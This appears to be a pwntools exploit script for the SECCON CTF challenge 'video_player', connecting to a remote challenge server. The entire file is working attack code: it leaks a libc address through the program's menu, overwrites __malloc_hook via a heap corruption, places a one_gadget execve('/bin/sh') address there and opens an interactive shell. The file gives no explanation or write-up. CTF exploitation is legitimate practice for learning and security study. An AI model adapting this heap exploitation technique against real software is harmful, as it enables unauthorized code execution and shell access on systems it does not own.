from pwn import *

#context.log_level = "debug"
HOST = "video_player.pwn.seccon.jp"
PORT = 7777
conn = remote(HOST, PORT)
#conn = process("./video_player", env={"LD_PRELOAD":"./libc.so.6"})
conn.sendlineafter("?", "harekaze")
for i in range(1):
    conn.sendlineafter(">>>", "1")
    conn.sendlineafter(">>>", "1")
    conn.sendafter(" : ", "A")
    conn.sendafter(" : ", "A")
    conn.sendafter(" : ", p32(0x118))
    conn.sendafter(" : ", "A")
    conn.sendafter(" : ", "A")
for i in range(1):
    conn.sendlineafter(">>>", "2")
    conn.sendlineafter(" : ", "0")
    conn.sendafter(" : ", "A")
    conn.sendafter(" : ", "A")
    conn.sendafter(" : ", p32(0x118))
    conn.sendafter(" : ", "A")
    conn.sendafter(" : ", "A")
LIBC_str = "\x00"
pause()
for i in range(6):
    conn.sendlineafter(">>>", "2")
    conn.sendlineafter(" : ", "0")
    conn.sendafter(" : ", "A")
    conn.sendafter(" : ", "A")
    conn.sendafter(" : ", p32(0x118))
    conn.sendafter(" : ", "A" * (i + 1))
    conn.sendafter(" : ", "A")
    conn.sendlineafter(">>>", "3")
    conn.sendlineafter(" : ", "0")
    conn.recvuntil("Playing video...\n")
    LIBC_str += chr(ord(conn.recvuntil("\n")[-2]) ^ 0xcc)
#0x7f8273a81000
LIBC = u64(LIBC_str + "\x00" * (8 - len(LIBC_str))) - (0x7f8273e45b00 - 0x7f8273a81000)
log.success("LIBC :0x%x" % LIBC)
#00000000003c4b10 V __malloc_hook
MALLOC_HOOK = LIBC + 0x3c4b10
log.success("MALLOC_HOOK :0x%x" % MALLOC_HOOK)
for i in range(1):
    conn.sendlineafter(">>>", "1")
    conn.sendlineafter(">>>", "1")
    conn.sendafter(" : ", "A")
    conn.sendafter(" : ", "A")
    conn.sendafter(" : ", p32(0x68))
    conn.sendafter(" : ", "A")
    conn.sendafter(" : ", "A")
for i in range(1):
    conn.sendlineafter(">>>", "2")
    conn.sendlineafter(" : ", "0")
    conn.sendafter(" : ", "A")
    conn.sendafter(" : ", "A")
    conn.sendafter(" : ", p32(0x68))
    conn.sendafter(" : ", p64(MALLOC_HOOK - 0x23))
    conn.sendafter(" : ", "A")
#0x45216	execve("/bin/sh", rsp+0x30, environ)
#constraints:
#  rax == NULL
#
#0x4526a	execve("/bin/sh", rsp+0x30, environ)
#constraints:
#  [rsp+0x30] == NULL
#
#0xf0274	execve("/bin/sh", rsp+0x50, environ)
#constraints:
#  [rsp+0x50] == NULL
#
#0xf1117	execve("/bin/sh", rsp+0x70, environ)
#constraints:
#  [rsp+0x70] == NULL
ONE_GADGET = LIBC + 0x4526a
for i in range(2):
    conn.sendlineafter(">>>", "1")
    conn.sendlineafter(">>>", "1")
    conn.sendafter(" : ", "A")
    conn.sendafter(" : ", "A")
    conn.sendafter(" : ", p32(0x68))
    conn.sendafter(" : ", "A" * 0x13 + p64(ONE_GADGET))
    conn.sendafter(" : ", "A")
context.log_level = "debug"
conn.interactive()
